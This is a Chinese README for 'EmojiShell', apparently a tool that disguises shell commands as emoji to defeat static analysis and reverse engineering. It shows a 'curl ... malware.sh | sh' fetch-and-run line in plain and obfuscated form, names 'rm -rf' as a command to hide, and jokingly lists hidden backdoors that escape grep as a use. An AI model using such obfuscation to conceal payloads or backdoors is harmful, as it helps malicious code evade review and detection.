🌟 EmojiShell | 用表情包守护你的 Shell 脚本

项目定位：

一个专注于 Emoji 混淆技术 的 Shell 脚本安全工具库，通过将敏感代码转换为颜文字、符号组合和动态字体，实现 视觉迷惑 与 逆向防御 的平衡。

🔑 核心功能

1. Emoji 代码伪装
   - 将 
"rm -rf" 转换为 
"✂️➡️🚫📁"，混淆关键指令
   - 支持自定义 Emoji 映射表（如 
"🐚=echo", 
"😈=sudo"）
2. 动态混淆引擎
   - 基于 Shell 的运行时语法代码加密（每次执行自动变换 Emoji 形式）
   - 结合 多种混合加密的 Emoji 编码方案
3. 反调试陷阱
   - 通过 
"$RANDOM" 生成伪随机 Emoji 流干扰静态分析
4. Shell 加壳工具
   - 一键生成混淆后的 
".sh" 二进制文件（兼容 Linux/macOS）
   - 支持自定义 Shell 解释器内容

🎯 技术亮点

- 立即部署：
“使用 Shell 来加密 Shell”
- 视觉欺骗设计：
EmojiCode

# 原始命令
curl https://example.com/malware.sh | sh

# EmojiShell 版本
${🐚}t${☕}p${🌐}s://${🔒}x${📡}m${🔍}l${🚪}.com/${💻}l${🖥}e.sh | ${💻}h
- 可扩展性：
   - 兼容 
"zsh"/
"ash" 等非标准 Shell 环境

🚀 快速上手

# 安装依赖
git clone https://github.com/haothtrteen/EmojiShell.git
cd EmojiShell && chmod +x install.sh

# 混淆示例
echo "whoami" | ./emoji-obfuscator --level hard
# 输出：👤${🔑}who${🔒}ami${🔓}

# 生成全加密脚本
暂时不建议

🛡️ 应用场景

- 敏感脚本保护：运维脚本、自动化渗透测试工具
- 代码混淆教学：逆向工程实验、CTF 题目设计
- 沙雕开发：用 Emoji 写出无法被 grep 搜索到的隐藏后门 😈

📜 许可证

- MIT License（开源自由，但禁止用于非法活动）
- 商业授权：企业级定制化混淆规则需联系 
"2557976190@qq.com"

🤝 参与贡献

1. Fork 仓库并提交 PR（如新增 Emoji 编码规则）
2. 报告漏洞至 Issues（标注 
"[Security]" 标签）
3. 在 Twitter 带话题 
"#EmojiShell" 分享你的混淆成果 🚀

最后更新：2025-09-10

项目愿景：让 Shell 脚本成为逆向工程师的噩梦 🧟♂️💻

设计思路

1.  Shell语法
2. 尝试通过emoji来代替函数变量
3. 编写自动化加密工具


# 目前仍存在的bug以及需要更新的功能

- 在执行复杂命令或语法时会无法运行，正在尝试修复（暂时尝试使用跳过关键指令加密来修复）
- 在ash（Android系统终端环境）中运行并不是特别理想在尝试优化
- 目前只支持对“0~9,a~z”所有的数字及英文字母进行加密，对特殊字符语言的加密需要更新
